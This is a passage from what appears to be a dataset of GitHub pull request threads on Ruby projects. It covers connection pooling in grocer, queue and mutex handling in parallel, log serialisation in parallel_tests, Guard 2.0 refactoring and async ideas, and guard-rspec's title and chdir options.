thread-safe, we're good. I just implemented it with connection_pool on my end and it seems to be working well."", ""Yeah do it with connection_pool and then you can take the responsibility for maintaining the concurrency stuff out of Grocer's codebase."", ""@d11wtq I tried to break some stuff down into smaller chunks last night. Also removed the looping pieces since it doesn't seem like it's needed. I still need to write some tests to verify this actually does what I think it does, but how does this look? https://github.com/grocer/grocer/compare/master...connection-pool"", ""I'm also thinking about disabling the connection pool by default, at least for now. Making it the default in a `1.0` release sounds like a better plan to me."", ""It looks like using @mperham connection_pool is used in a couple of places to enable user to run non-thread safe gems in a threaded environment (e.g.:  sidekiq)\r\n\r\nOne example:\r\nhttps://github.com/brewster/cequel/blob/master/lib/cequel/keyspace.rb#L53-66\r\n\r\nOne thing to note, that it creates all the connections at pool creation.\r\n\r\nI'd like to see some functionality like this incorporated."", 'Thanks @kbrock. Totally still an option.', ""Tried using the connection_pool gem w/ sidekiq but it seems like only every other notification is being sent through.  Could anyone give me an example of what you need to get it working with connection_pool?  Here's what I have setup but I am probably missing something:\r\n\r\n``` objective-c\r\nclass Worker\r\n  include Sidekiq::Worker\r\n\r\n  GROCER_POOL = ConnectionPool.new(size: 10, timeout: 5) { Grocer.pusher(certificate: ENV['APNS']) }\r\n  def perform(resource_id, message)\r\n    GROCER_POOL.with do |pusher|\r\n        ...\r\n        pusher.push(notification)\r\n    end\r\n  end\r\nend\r\n```"", 'hi @chourobin \r\nThat is pretty much it.\r\n\r\nDo you know if you are sending any invalid notificaitons? It sounds like you are having problems similar to #14 \r\n\r\nAlso keep in mind that you are creating 10 connections to apple at startup. The connections are not lazily established when talking with apple.\r\n', ""@kbrock Thanks, it turns out you were right there was an invalid device token being used causing #14 to occur.  I also reduced the size of the pool from 10 to 1 and it's working great. Thanks!\r\n"", 'bump. whats the progress on this pr?', ""@kbrock and @vanstee I know it's been a while, but is the consensus (for now) to **not** add connection pool support directly to Grocer, but instead wrap connections in a connection pool. e.g., use the `connection_pool` gem as mentioned above?"", 'I lean towards using the connection_pool gem. it worked great.']"
281,grosser/parallel,107.0,"@amw does this look good ?
I'll try processes next ...

","[""This looks much better indeed, but I see some issues that are coming to bite you when you start implementing processes and queues. Issues that I have already solved in my PR. Is there any particular reason for why you're doing all this from scratch instead of pulling my code or working with it as a base?"", ""Mostly just for fun / to understand the reasons why the code is the way it\r\nis :)\r\n\r\n\r\n\r\nOn Fri, Aug 22, 2014 at 2:46 AM, Adam Wr\xc3\xb3bel <notifications@github.com>\r\nwrote:\r\n\r\n> This looks much better indeed, but I see some issues that coming to bite\r\n> you when you start implementing processes and queues. Issues that I have\r\n> already solved in my PR. Is there any particular reason, why you're doing\r\n> all this from scratch instead of pulling my code or working with it as a\r\n> base?\r\n>\r\n> \xe2\x80\x94\r\n> Reply to this email directly or view it on GitHub\r\n> <https://github.com/grosser/parallel/pull/107#issuecomment-53042409>.\r\n>"", 'added processes, looking good ?', 'Do you plan to support queues too? They are much more efficient most of the time since worker threads are not locked most of the time producing items. And also can easily be used to iterate enumerable without converting to array.', ""I don't really see any point is this micro optimization,\r\ndo you have any usecase where this would actually matter ?\r\n\r\n\r\nOn Sun, Aug 24, 2014 at 8:55 PM, Adam Wr\xc3\xb3bel <notifications@github.com>\r\nwrote:\r\n\r\n> Do you plan to support queues too? They are much more efficient most of\r\n> the time since worker threads are not locked most of the time producing\r\n> items. And also can easily be used to iterate enumerable without converting\r\n> to array.\r\n>\r\n> \xe2\x80\x94\r\n> Reply to this email directly or view it on GitHub\r\n> <https://github.com/grosser/parallel/pull/107#issuecomment-53224764>.\r\n>"", ""I would say I rarely see use case for lambdas. I use queues most of the time, because:\r\n\r\n1. I can iterate ActiveRecord or Mongo result set and process items as they are pulled from DB, without instantiating everything in memory. Not possible with lambdas at all.\r\n2. Generating item often takes some significant time. If you have 4 or 8 worker processes calling lambda one at a time and it doesn\xe2\x80\x99t return immediately, you\xe2\x80\x99re effectively working in two threads - one generating and one consuming an item.\r\n\r\n> On Aug 25, 2014, at 05:58, Michael Grosser <notifications@github.com> wrote:\r\n> \r\n> I don't really see any point is this micro optimization, \r\n> do you have any usecase where this would actually matter ? \r\n> \r\n> \r\n> On Sun, Aug 24, 2014 at 8:55 PM, Adam Wr\xc3\xb3bel <notifications@github.com> \r\n> wrote: \r\n> \r\n> > Do you plan to support queues too? They are much more efficient most of \r\n> > the time since worker threads are not locked most of the time producing \r\n> > items. And also can easily be used to iterate enumerable without converting \r\n> > to array. \r\n> > \r\n> > \xe2\x80\x94 \r\n> > Reply to this email directly or view it on GitHub \r\n> > <https://github.com/grosser/parallel/pull/107#issuecomment-53224764>. \r\n> >\r\n> \xe2\x80\x94\r\n> Reply to this email directly or view it on GitHub <https://github.com/grosser/parallel/pull/107#issuecomment-53224894>.\r\n> "", ""`lambda { Queue.pop }` would be queue support ?\r\nhow would ar work, you have to call find_each anyway, so we have to do some\r\nfiber mess, or did you have something else in mind ?\r\n```Ruby\r\ncurrent = []\r\nf = Fiber.new { Foo.find_each(:batch_size => 1){ |x| Fiber.yield x } }\r\nlambda { current = f.resume if current.empty?; current ? current.pop :\r\nParallel::Stop }\r\n```\r\n\r\n\r\nOn Sun, Aug 24, 2014 at 9:05 PM, Adam Wr\xc3\xb3bel <notifications@github.com>\r\nwrote:\r\n\r\n> I would say I rarely see use case for lambdas. I use queues most of the\r\n> time, because:\r\n>\r\n> 1. I can iterate ActiveRecord or Mongo result set and process items as\r\n> they are pulled from DB, without instantiating everything in memory. Not\r\n> possible with lambdas at all.\r\n> 2. Generating item often takes some significant time. If you have 4 or 8\r\n> worker processes calling lambda one at a time and it doesn\xe2\x80\x99t return\r\n> immediately, you\xe2\x80\x99re effectively working in two threads - one generating and\r\n> one consuming an item.\r\n>\r\n> > On Aug 25, 2014, at 05:58, Michael Grosser <notifications@github.com>\r\n> wrote:\r\n> >\r\n> > I don't really see any point is this micro optimization,\r\n> > do you have any usecase where this would actually matter ?\r\n> >\r\n> >\r\n> > On Sun, Aug 24, 2014 at 8:55 PM, Adam Wr\xc3\xb3bel <notifications@github.com>\r\n> > wrote:\r\n> >\r\n> > > Do you plan to support queues too? They are much more efficient most\r\n> of\r\n> > > the time since worker threads are not locked most of the time\r\n> producing\r\n> > > items. And also can easily be used to iterate enumerable without\r\n> converting\r\n> > > to array.\r\n> > >\r\n> > > \xe2\x80\x94\r\n> > > Reply to this email directly or view it on GitHub\r\n> > > <https://github.com/grosser/parallel/pull/107#issuecomment-53224764>.\r\n> > >\r\n> > \xe2\x80\x94\r\n> > Reply to this email directly or view it on GitHub <\r\n> https://github.com/grosser/parallel/pull/107#issuecomment-53224894>.\r\n> >\r\n>\r\n> \xe2\x80\x94\r\n> Reply to this email directly or view it on GitHub\r\n> <https://github.com/grosser/parallel/pull/107#issuecomment-53225143>.\r\n>"", 'Yeah `lambda { queue.pop }` could work somewhat, but then you\'re blocking the same mutex that the producer thread might need. See `it ""does not lock provided produce/start/finish mutex to pop queue""` test case supplied in my pull request.\r\n\r\nYou can take a look on an example of using mutex inside producer thread in [this paragraph](https://github.com/amw/parallel#queues-vs-lambdas) of Readme from my pull request. The whole idea of taking user supplied mutex (which you do) was to allow using it in producer thread. With your current implementation all your worker threads will lock that mutex when running lambda and then when producer tries to synchronize you will be left with a deadlock.', 'Yes, this specific usecase would not work, but it could be replaced by an\r\nindependent `puts_mutex`.\r\n\r\nIdeally I want to shield users from this multithreaded madness going on,\r\nthey should just get their callbacks and everything should behave as normal\r\nas possible (finish/start/produce being on same thread & not interfering\r\nwith each other).\r\n\r\nIf there is a reason to have different mutexes (is there?), we can add more\r\nfine-grained control like `:mutex => {:produce => xxx, :start_finish =>\r\nyyy}`.\r\n\r\n\r\nOn Sun, Aug 24, 2014 at 9:50 PM, Adam Wr\xc3\xb3bel <notifications@github.com>\r\nwrote:\r\n\r\n> Yeah lambda { queue.pop } could work somewhat, but then you\'re blocking\r\n> the same mutex that the producer thread might need. See it ""does not lock\r\n> provided produce/start/finish mutex to pop queue"" test case supplied in\r\n> my pull request.\r\n>\r\n> You can take a look on an example of using mutex inside producer thread in this\r\n> paragraph <https://github.com/amw/parallel#queues-vs-lambdas> of Readme\r\n> from my pull request. The whole idea of taking user supplied mutex (which\r\n> you do) was to allow using it in producer thread. With your current\r\n> implementation all your worker threads will lock that mutex when running\r\n> lambda and then when producer tries to synchronize you will be left with a\r\n> deadlock.\r\n>\r\n> \xe2\x80\x94\r\n> Reply to this email directly or view it on GitHub\r\n> <https://github.com/grosser/parallel/pull/107#issuecomment-53226618>.\r\n>', 'There is no reason to accept user-supplied mutex other than for allowing it to be used by user in his own producer thread. To protect start/finish/lambda from each other you can create your own mutex.\r\n\r\n> On Aug 25, 2014, at 18:02, Michael Grosser <notifications@github.com> wrote:\r\n> \r\n> Yes, this specific usecase would not work, but it could be replaced by an \r\n> independent `puts_mutex`. \r\n> \r\n> Ideally I want to shield users from this multithreaded madness going on, \r\n> they should just get their callbacks and everything should behave as normal \r\n> as possible (finish/start/produce being on same thread & not interfering \r\n> with each other). \r\n> \r\n> If there is a reason to have different mutexes (is there?), we can add more \r\n> fine-grained control like `:mutex => {:produce => xxx, :start_finish => \r\n> yyy}`. \r\n> \r\n> \r\n> On Sun, Aug 24, 2014 at 9:50 PM, Adam Wr\xc3\xb3bel <notifications@github.com> \r\n> wrote: \r\n> \r\n> > Yeah lambda { queue.pop } could work somewhat, but then you\'re blocking \r\n> > the same mutex that the producer thread might need. See it ""does not lock \r\n> > provided produce/start/finish mutex to pop queue"" test case supplied in \r\n> > my pull request. \r\n> > \r\n> > You can take a look on an example of using mutex inside producer thread in this \r\n> > paragraph <https://github.com/amw/parallel#queues-vs-lambdas> of Readme \r\n> > from my pull request. The whole idea of taking user supplied mutex (which \r\n> > you do) was to allow using it in producer thread. With your current \r\n> > implementation all your worker threads will lock that mutex when running \r\n> > lambda and then when producer tries to synchronize you will be left with a \r\n> > deadlock. \r\n> > \r\n> > \xe2\x80\x94 \r\n> > Reply to this email directly or view it on GitHub \r\n> > <https://github.com/grosser/parallel/pull/107#issuecomment-53226618>. \r\n> >\r\n> \xe2\x80\x94\r\n> Reply to this email directly or view it on GitHub <https://github.com/grosser/parallel/pull/107#issuecomment-53284497>.\r\n> ', ""It's really not such a complex problem. You just cannot block producer with workers checking for existence of new items. Lambda is safe to synchronize, because once it runs it should produce the item itself. Queue should not be synchronized with the same mutex that could be needed by producer to push item onto it. Queue needs not to be synchronized externally at all, because it's internally protected and `pop` safely waits until item is available."", ""Agreed, mutex option is pointless atm, it's also not documented, so I don't\r\nexpect anyone to use it. I don't see any real issue with the current\r\nimplementation though, if the producer is expensive it can just do:\r\n```Ruby\r\nThread.new { items << produce }\r\nproducer = lambda { until item = items.pop; sleep 0.1; end; item }\r\n```\r\n\r\nLambdas are already an edge-case, catering to even more elusive edge-cases\r\nlike queues and mutexes/synchronization will just bloat the code even more\r\nand make it harder to get the core experience as simple/straightforward as\r\npossible, so I'd like to avoid that unless it's impossible to implement,\r\nwhich afaik it is not ...\r\n\r\n\r\nOn Mon, Aug 25, 2014 at 9:38 AM, Adam Wr\xc3\xb3bel <notifications@github.com>\r\nwrote:\r\n\r\n> It's really not such a complex problem. You just cannot block producer\r\n> with workers checking for existence of new items. Lambda is safe to\r\n> synchronize, because once it runs it should produce the item itself. Queue\r\n> should not be synchronized with the same mutex that could be needed by\r\n> producer to push item onto it. Queue needs not to be synchronized\r\n> externally at all, because it's internally protected and pop safely waits\r\n> until item is available.\r\n>\r\n> \xe2\x80\x94\r\n> Reply to this email directly or view it on GitHub\r\n> <https://github.com/grosser/parallel/pull/107#issuecomment-53289019>.\r\n>"", 'Using an items Array like that is:\r\n1) insecure because Array is not thread safe and you\'re not guarding it with anything on that `Thread.new` block\r\n2) inefficient because you\'re sleeping for entire tenth of a second, blocking lambda mutex and preventing any other start/finish/produce from executing\r\n3) in no way more simple code-wise than using a queue. Compare:\r\n\r\n```\r\nitems = []\r\nThread.new { items << produce}\r\nproducer = lambda { until item = items.pop; sleep 0.1; end; item }\r\n```\r\n\r\nvs\r\n\r\n```\r\nitems = Queue.new\r\nThread.new { items << produce }\r\nproducer = lambda { items.pop }\r\n```\r\n\r\nQueues/guarded-arrays are currently the only way to handle a very common requirement of iterating DB results or any other enumerable. You just cannot do it with a simple lambda. Whether we need to share common resources between that producer thread and start/finish callbacks is another thing. Maybe it is sufficient to access those resources in `start`. Then yes, you don\'t need an option for mutex.\r\n\r\nSimple case without mutex:\r\n\r\n```\r\nqueue = SizedQueue.new 10\r\nThread.new do\r\n  db_result.each do |item|\r\n    queue.push item\r\n  }\r\n  queue.push Parallel::EndOfIteration\r\nend\r\nstart = lambda {|item,index|\r\n  # the following puts would compete with any `puts` in the producer code\r\n  puts ""Processing #{item}""\r\n}\r\nParallel.map(queue, :start => start) {|item| ...}\r\n```\r\n\r\nMore advanced case with option for mutex:\r\n\r\n```\r\nmutex = Mutex.new\r\nqueue = SizedQueue.new 10\r\nThread.new do\r\n  db_result.each do |item|\r\n    mutex.synchronize do\r\n      puts ""Generated #{item}""\r\n    end\r\n    queue.push item\r\n  }\r\n  queue.push Parallel::EndOfIteration\r\nend\r\nstart = lambda {|item,index|\r\n  # the following puts does not compete with `puts` in the producer code\r\n  puts ""Processing #{item}""\r\n}\r\nParallel.map(queue, :mutex => mutex, :start => start) {|item| ...}\r\n```', 'yeah, the `preventing any other start/finish/produce from executing` is a bad bug :/\r\n2 different ones should do it, right?: 1 for start+finish, 1 for produce (so we do not produce multiple items in parallel)\r\n...\r\n\r\nfor the seconds case, this should be fine too, right ? / no need to pass a mutex in\r\n\r\n```Ruby\r\nstart = lambda {|item,index|\r\n   mutex.synchronize { puts ""Processing #{item}"" }\r\n}\r\n```\r\n\r\n`producer = lambda { items.pop }` works, right ? <-> I\'d like to avoid detecting things by if they respond to pop etc, maybe `.is_a?(Queue)` ...\r\n', "" - changed so producer has it's own mutex\r\n - no longer calls producer when it previously returned Stop.\r\n - supports queues by wrapping them in lambda and using blocking pop\r\n\r\ndoes this sound good / do you see any other issues ?"", ""Lambda should definitely use the same mutex as `start` and `finish`. The idea is that only the block passed to `Parallel.map` is executed in parallel and all user callbacks can share the same resources.\r\n\r\nThere is no danger of using the blocking `queue.pop` inside lambda if the mutex used to protect the lambda is not user provided. If that is your own private mutex then it will lock in order for 1. `produce`, 2. `start`, 3. `finish` and will never cause a deadlock. User's `Thread.new` block (if it cannot use our mutex) will eventually push something onto the queue and allow us to proceed.\r\n\r\nSure, locking that mutex just for popping a queue is an inefficiency compared to how I support queues in my PR, but it's better than not protecting the lambda from `start` or `finish` callbacks. And frankly, `queue.pop` should return immediately in most of the cases. After all we're using the queue and parallel processing, because we think we can generate items much faster than consume them."", ""I'm a little worried about the `producer sleeps -> no item can start or\nfinish`\ncase, but at least that's straightforward compared to randomly occurring\nproblems from parallel execution ...\n\nI'll change the mutex logic back and cut a release and we can see if anyone\nruns into these issues ...""]"
282,grosser/parallel_tests,179.0,"Some continuous integration servers like TeamCity expect log output to be in a specific format. They have rather complicated formatters for both rspec and capybara. When running with parallel_tests the processes run over one another. It would be nice if somehow each process wrote stdout and stderr to a separate file and then once the process terminated it automatically dumped the contents of that file to stdout/stderr on the original rake call. I'm not sure if this is clear or not, but basically it would provide a way to serialize log output from any formatter.","['Yes!!  It would be most excellent not only to have the option to dump the contents of the tmp file to STDOUT/STDERR but also just save the file for archival purposes and later historical analysis.', ""This serializes stdout. It also adds PARALLEL_TEST_ARGS as an environment variable you can use to modify rake tasks. I wasn't sure the best way to do that, but I wanted to be able to pass the new flag via rake tasks w/o rolling my own rake tasks. I'm open to other ideas on that one and other ideas on how to serialize the output.\r\n\r\nI opted not to serialize stderr."", 'I like the idea and it does not add a giant amount of complexity :)\r\nSome kind of mention in the readme would help people find it easier.', 'Ok, give it a look over please. Everything but the `.rspec` thing should be addressed', ':+1: looks good, also some nice tests :)\r\nTravis failed on ree, do you know if it is this reproducible or just something random ?', 'Thanks. I think that was a legit nasty 1.8.7 difference. Fixed.', ':+1: Tried it in a few projects and seems to work :)\r\n-> 0.10.3 thanks!']"
283,guard/guard,609.0,"As you explain in the README, the **RUBYGEMS_GEMDEPS** also takes care of Gemfile-plumbing in newer versions of Rubygems. So here I skipped the warning if that env var is set.

Also, I should note that I poked around a little inside the `Gem` class to see if there was a way of asking it if gem dependencies have been activated either way rather than querying individually the existence of these env vars, but I didn't find anything. Perhaps someone else does in case I overlooked something, which is likely.

Unrelated aside: Guard's test env breaks when actually using **RUBYGEMS_GEMDEPS** in the shell, so I just ran the tests without it.","['\n[![Coverage Status](https://coveralls.io/builds/956270/badge)](https://coveralls.io/builds/956270)\n\nCoverage increased (+0.0%) when pulling **093bc23033ce654333537d92e7646612ac38c326 on hakanensari:rubygems-env-var** into **19351271941a3362a47176c6808ddcb4a675e3ad on guard:master**.\n', 'Thanks!']"
284,guard/guard,611.0,"Hello,


I was trying to focus on one of the plugins specified in my `Guardfile` and, hence, provided the `-P` option to the CLI.  When I started adjusting `Guardfile` later on, Guard was re-evaluating it as expected, but it wasnt taking into account the CLI options.  I would appreciate any feedback. If it is the desired behavior, please do not hesitate to close the pull request.


Best wishes,
Ivan","['\n[![Coverage Status](https://coveralls.io/builds/1011330/badge)](https://coveralls.io/builds/1011330)\n\nCoverage decreased (-0.67%) when pulling **5bc78000c51551b153aadcbddf4da24d7dc44af5 on IvanUkhov:scope-setup** into **19351271941a3362a47176c6808ddcb4a675e3ad on guard:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/1011333/badge)](https://coveralls.io/builds/1011333)\n\nCoverage increased (+0.02%) when pulling **bf0abf37273d5b4ba1120025d59a34376904ca74 on IvanUkhov:scope-setup** into **19351271941a3362a47176c6808ddcb4a675e3ad on guard:master**.\n', '@rymai sounds good to you?', 'Yep! Thanks @IvanUkhov!']"
285,guard/guard,431.0,"Hi guys!

With 2.0 in mind, I've made many refactorings to almost all the parts of the code!

* As discussed in #426, I've deprecated `Guard::Guard` in favor of `Guard::Plugin` (with a deprecation warning message show-able with the `--show-deprecations` options).
* I've moved many methods from `Guard` to `Guard::Deprecator`, `Guard::Setuper`, `Guard::PluginUtil`. See the individual commits for the details.
* I've also moved `Guard::Hook` into `Guard::Plugin::Hooker` and created a new `Guard::Plugin::Base` for the common methods of `Guard::Plugin` and `Guard::Guard` (deprecated).

See the individual commits for the other stuff I forgot to mention here!

Thanks for the feedback!","['Looks super nice to me, very good job @rymai !', ""Cool thanks! It's only refactorings but I think it's needed!\r\n\r\nI didn't even start the to-dos of #426! :P"", 'Can you rebase on v2.0 branch, so it should be tested on Travis CI. Thanks!', '\n[![Coverage Status](https://coveralls.io/builds/20634/badge)](https://coveralls.io/builds/20634)\n\nCoverage decreased (-0.07%) when pulling **da2f41196ffbdb049e77f0f8c9029c08bbadbe9e on v2.0_refactorings** into **31a495627179575660d864cf71f9e328e05b3873 on v2.0**.\n', 'Done!', ""Thanks, we'll wait other @guard/core-team feedback :)"", 'Sure!', '\n[![Coverage Status](https://coveralls.io/builds/20647/badge)](https://coveralls.io/builds/20647)\n\nCoverage increased (+0.11%) when pulling **f98aef9b323bd89dffe4b6c0229587112df1539f on v2.0_refactorings** into **31a495627179575660d864cf71f9e328e05b3873 on v2.0**.\n', 'Wow. Awesome work. That will increase the code climate score definitely. Thanks a lot!', 'Some todos (for me) before I merge this:\r\n- [x] Fix inline doc for `Guard#guards`\r\n- [x] Fix inline doc for `Guard#groups`\r\n- [x] Fix inline doc for `Guard#add_guard`\r\n- [x] Document all the `Guard::Setuper` methods\r\n- [x] Improve inline doc for `Guard::Plugin::Base#name` (give an example)\r\n- [x] Improve inline doc for `Guard::Plugin::Base#title` (give an example)\r\n- [x] Improve inline doc for `Guard::Plugin::Base#to_s` (give an example)\r\n- [x] Improve inline doc for `Guard::Group#title` (give an example)\r\n- [x] Deprecate `Guard.locate_guard` (instead of removing it directly)\r\n- [x] Deprecate `Guard.guard_gem_names` (instead of removing it directly)\r\n- [x] Mark methods that are not included in the public API as private\r\n- [x] Allow `Guard::PluginUtil.initialize` to pass a full plugin name (e.g. `guard-rspec`) or only its name (e.g. `rspec`)\r\n- [x] Check the generated Yard doc', '\n[![Coverage Status](https://coveralls.io/builds/22058/badge)](https://coveralls.io/builds/22058)\n\nCoverage decreased (-0.05%) when pulling **c5c53ee078625e822a5f7b04fd22c2c888acdeb1 on v2.0_refactorings** into **31a495627179575660d864cf71f9e328e05b3873 on v2.0**.\n', '\n[![Coverage Status](https://coveralls.io/builds/22548/badge)](https://coveralls.io/builds/22548)\n\nCoverage decreased (-0.12%) when pulling **a1320f6ab5191e0f58e173e5bc863440f252f2e7 on v2.0_refactorings** into **31a495627179575660d864cf71f9e328e05b3873 on v2.0**.\n', '\n[![Coverage Status](https://coveralls.io/builds/22559/badge)](https://coveralls.io/builds/22559)\n\nCoverage increased (+0.15%) when pulling **e3c86085533d833e9057019628885a94baf5f7f8 on v2.0_refactorings** into **31a495627179575660d864cf71f9e328e05b3873 on v2.0**.\n', '\n[![Coverage Status](https://coveralls.io/builds/22562/badge)](https://coveralls.io/builds/22562)\n\nCoverage decreased (-0.03%) when pulling **e3c86085533d833e9057019628885a94baf5f7f8 on v2.0_refactorings** into **31a495627179575660d864cf71f9e328e05b3873 on v2.0**.\n', 'I have been thinking about this a fair bit and architecturally I see a few significant problems with Guard that are very tricky to address. \r\n\r\nMy current dilema\r\n\r\nI have a test suite that takes 3 minutes to run, when I save a spec I would like to ""interrupt"" the suite, run the spec and then continue with the rest of the tests. However ... \r\n\r\n1. There is no provision to deliver events to an already running task.\r\n2. There is no way to return ""async"" status and eventual status\r\n3. There is not provision in guard to deliver the actual name of the file touched coupled with the test (which helps me decide on what to do) \r\n\r\nNow, I am not sure if you could easily write a simplistic tmux clone in Ruby, or simply use the tmux-ruby gem to split the outputs of async tasks ... this is all super mighty ambitious \r\n\r\n3) is clearly in scope for 2.0 api, but I am concerned I will still not get exactly what I want unless there is a way of splitting the output. (pry / control) in one tmux pane, (output in another) \r\n\r\nDon\'t know what you think about all of this raising so you can have a think ', 'Having each guard/group running in there own thread, would allow us to interact with them and running them concurrently. It could be very Interesting. Also using Celluloid for doing that would be great :)', '@thibaudgg fyi I wrote an an async runner for Discourse now, https://github.com/discourse/discourse/blob/master/lib/autospec/runner.rb will blog about it, using the notify gem but read through the source it gets involved and multithreaded ... really wish I could just sit on guard there. ', '@guard/core-team what do you think of @SamSaffron use case?', 'The use case is great and we discussed very similar things already, but no one had time to implement it :)', '@SamSaffron do you want to handle it? :)', '@thibaudgg I have been thinking about this, I think the biggest issue here is nailing the API ... was thinking something along these lines \r\n\r\n\r\n```ruby \r\ndef run_on_changes(paths, original_paths, finish_callback)\r\n\r\n  # for async \r\n   :async\r\nend\r\n\r\ndef status\r\n   # :running, :idle\r\nend\r\n\r\n# somewhere else when done \r\nfinish_callback.call(result)\r\n\r\n```\r\n', ""@SamSaffron what do you think of using [Celluloid Notification](https://github.com/celluloid/celluloid/wiki/Notifications) for this? I'm rewriting the Listen gem with Celluloid and I'm thinking to also maybe using it for Guard 2.0, so it could be a good use case for it."", '@thibaudgg \r\nI think that would work fine, you would not need to send a callback in, one change though is that you would probably need to track who you are ... so \r\n\r\n```\r\ndef run_on_changes(paths, original_paths, id)\r\n\r\n  # for async \r\n   :async\r\nend\r\n\r\n# then on complete\r\nGuard.publish(id, :complete, results)\r\n```\r\n\r\n', 'What would be the id here? Some unique identifier that change every run, or a guard-plugin identifier?', 'I think a per-run id is the right thing to do, that way when you handle the messages you can validate that you are getting what you expect and not some bogus message from a previous run.', ""Ok sounds good. Let me finish the Listen rewrite (count maybe 4-6 weeks) and I'll start the Celluloid transition for Guard 2.0\r\n\r\n@guard/core-team what do you think of using Celluloid for Guard 2.0? I'm quite happy with if for Listen (no commit published yet sadly... big big rewrite :))"", ""nice! sounds like a plan\r\n\r\n\r\nOn Mon, May 13, 2013 at 4:36 PM, Thibaud Guillaume-Gentil <\r\nnotifications@github.com> wrote:\r\n\r\n> Ok sounds good. Let me finish the Listen rewrite (count maybe 4-6 weeks)\r\n> and I'll start the Celluloid transition for Guard 2.0\r\n>\r\n> @guard/core-team what do you think of using Celluloid for Guard 2.0? I'm\r\n> quite happy with if for Listen (no commit published yet sadly... big big\r\n> rewrite :))\r\n>\r\n> \xe2\x80\x94\r\n> Reply to this email directly or view it on GitHub<https://github.com/guard/guard/pull/431#issuecomment-17794790>\r\n> .\r\n>"", '\n[![Coverage Status](https://coveralls.io/builds/42244/badge)](https://coveralls.io/builds/42244)\n\nCoverage increased (+0%) when pulling **232b1537bec5831075fd1a4a86be64e72e7f91f0 on v2.0_refactorings** into **31a495627179575660d864cf71f9e328e05b3873 on v2.0**.\n', '\n[![Coverage Status](https://coveralls.io/builds/42800/badge)](https://coveralls.io/builds/42800)\n\nCoverage increased (+0%) when pulling **29984f70c252fa51220929b46a1f3f012ecdde75 on v2.0_refactorings** into **31a495627179575660d864cf71f9e328e05b3873 on v2.0**.\n', '\n[![Coverage Status](https://coveralls.io/builds/43547/badge)](https://coveralls.io/builds/43547)\n\nCoverage increased (+0%) when pulling **2b6583a28650fdcb9fa43ebcc77956c3f83ab8cd on v2.0_refactorings** into **31a495627179575660d864cf71f9e328e05b3873 on v2.0**.\n']"
286,guard/guard-rspec,282.0,Adds a configurable title for notifications. It falls back to 'RSpec results' if one isn't provided.,"['\n[![Coverage Status](https://coveralls.io/builds/1105845/badge)](https://coveralls.io/builds/1105845)\n\nCoverage decreased (-7.98%) when pulling **dba13758ab3c6d103d4017bbd908532a64fb8207 on cazrin:title-option** into **f1e3d9183808df0925223d845a81c4837ab51887 on guard:master**.\n', 'Thanks!']"
287,guard/guard-rspec,287.0,"I think current watchdir option doesn't work as it should (please correct me if I'm missing something).

My recent project was consisted of many different modules each of them having it's own tests suite.
I've tried to use watchdir option but it didn't work as I expected.

I've created sample project and described steps to reproduce the issue and fix for the issue with my forks (https://github.com/lesniakania/guard and https://github.com/lesniakania/guard-rspec):

https://github.com/lesniakania/multiple-modules-with-guard

These changes depends on changes I've made in guard repo.","['Wow, nice that you use houndci. Of course I will fix things it pointed out.', '\n[![Coverage Status](https://coveralls.io/builds/1308095/badge)](https://coveralls.io/builds/1308095)\n\nCoverage decreased (-7.83%) when pulling **aeebae3de3af93261b8e3b8207bf3f0de2f31e43 on lesniakania:master** into **2bdd89ee0c42c1574738b8405d97be32ebd93224 on guard:master**.\n', 'Hi @lesniakania\r\n\r\nFirst of all, there are many failing specs (see Travis build status)!\r\n\r\nSecond, `watchdir` option only needed when you want `guard` to notice file changes in dirs outside of current working dir (or to watch multiple different places). If you want to run certain tasks on modifications within `./moduleA` dir, you should be able to do that with `Guardfile`, like that:\r\n\r\n```ruby\r\n# Guardfile\r\n...\r\nwatch(%r{^moduleA/(.+)\\.rb$}) { |m| ""moduleA/spec/#{m[1]}_spec.rb"" }\r\n...\r\n```', ""Hi @907th \r\n\r\nas I mentioned the changes depends on the `guard` repo, but according to the `README` I should not change the version so I've also couldn't express this in gemspec here. so tests are not passing but they are passing for me locally with dependencies setup properly.\r\n\r\nAbout the watchdir option itself, according to the `README` it should make that\r\n\r\n`Guard can watch any number of directories instead of only the current directory`\r\n\r\nBut firstly, paths from other than current directories are not propagated to the plugins and secondly even when they were the command to run the tests needs to be executed from the particular directory, which was not done.\r\n\r\nCezary Baginski opened the issue for that - https://github.com/guard/guard/issues/634\r\n\r\nAlso I think addidng additional regexps to `Guardfile` is not the best solution, as you can have many modules and repeating every regexp for each of them would produce lots of duplication. I thought `watchdir` option should just work in such situations, so you can have generic `Guardfile` that is used to watch all `watchdirs` you pass to the option."", '@lesniakania Thanks for the explanation! Great job! I think we should wait until guard/guard#634 and guard/guard#633 is resolved.', '\n[![Coverage Status](https://coveralls.io/builds/1333644/badge)](https://coveralls.io/builds/1333644)\n\nCoverage increased (+0.37%) when pulling **158dadc09e64df8958728bd8f85f900340045304 on lesniakania:master** into **2bdd89ee0c42c1574738b8405d97be32ebd93224 on guard:master**.\n', 'Nice! :+1: ', '@lesniakania @e2 What `chdir` option actually needed for?', ""@907th - `chdir` allows running rspec from withing a given directory (by building a command like `cd backend && rspec (...)`).\r\n\r\nIt's more of a workaround for allowing rspec to be run with a specific configuration in some arbitrary project subdirectory (e.g. `backend/spec` instead of `spec`) - setting up the correct rspec commandline to avoid the `cd` is probably too riskly and/or too much work.\r\n\r\nIt is a bit strange to have a chdir option in a specific plugin like guard-rspec - but of course guard can't do Dir.chdir (from within the Guardfile) without major side-effects.\r\n\r\nPersonally I think subdirs with custom/alternative rspec configurations could just have their own Guardfiles - so multiple guard instances would be running from each subdir (e.g. manually doing `cd backend && bundle exec guard`).\r\n\r\nIn short: `chdir` option allows handling custom rspec configs (subdirs) without making guard-rspec too complex or brittle. It's not the best solution, but probably the one with the least tradeoffs."", 'Thanks! So `chdir` does not solve the original problem (running guard with multiple submodules)? `README` need to be updated too.', '`chdir` does solve the original problem if the Guardfile has specific rules for every directory (e.g. separate rules/matchers for `spec`, `backend/spec`, `frontend/spec` - and since it\'s Ruby, those rules can be generated automatically for every ""discovered"" submodule or subdir).\r\n\r\nSo the solution is to use a more complex Guardfile and guard-rspec\'s `chdir` option above - instead of the previous solution of relying on Guard\'s `watchdirs` as a list of ""submodules"".\r\n\r\n(I\'ll update guard\'s `watchdirs` docs after pulling https://github.com/guard/guard/pull/633). ', '@e2 What value `chdir` should have in case of several submodules (`spec`, `backend/spec`, `frontend/spec`)?', '@907th - you\'d have a Guardfile with groups, e.g.:\r\n\r\n```ruby\r\n\r\ngroup :backend do\r\n  guard :rspec, chdir: \'backend\' do\r\n    watch(%r{^backend/spec/.+_spec\\.rb$})\r\n  